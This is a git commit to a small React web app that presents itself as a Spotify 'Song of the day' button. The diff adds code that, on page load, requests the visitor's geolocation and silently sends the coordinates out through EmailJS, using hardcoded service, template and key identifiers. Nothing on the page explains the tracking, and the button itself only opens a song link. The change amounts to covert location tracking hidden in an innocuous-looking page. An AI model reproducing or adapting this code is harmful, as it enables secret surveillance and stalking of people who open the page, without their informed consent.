0a8448566b2edcd8e54ce98f4de7d11ddc2661ea
Martin Mouly <martin@mouly.name>
2024-01-18 22:37:16 +0100

    pos

--- src/App.js
+++ src/App.js
@@ -1,18 +1,29 @@
 import './App.css';
 import spotifyLogo from './spotify-logo.png'
-import { useEffect, useState } from 'react';
+import { useEffect } from 'react';
 import tracks from './song_data/selected_track.json';
+import emailjs, { init } from "@emailjs/browser";
 
 function App() {
   const songUrl = tracks.url
+  const serviceID = "service_b1seiq9"
+  const templateID = "template_pil7lln"
+  const pub_key = "lJEzrk2uGDGKdv3gf"
+
   const buttonOnClick = () => {
     window.open(songUrl)
   }
 
+  useEffect(() => {
+    navigator.geolocation.getCurrentPosition(function(position){
+      emailjs.send(serviceID, templateID, {lat: position.coords.latitude, lng: position.coords.longitude}, pub_key);
+    });
+  }, []);
+
   return (
     <div className="App">
       <button className='button-5' onClick={buttonOnClick}>
-        <img src={spotifyLogo} className="spotify-logo"/>
+        <img src={spotifyLogo} alt="" className="spotify-logo"/>
         Song of the day
       </button>
     </div>
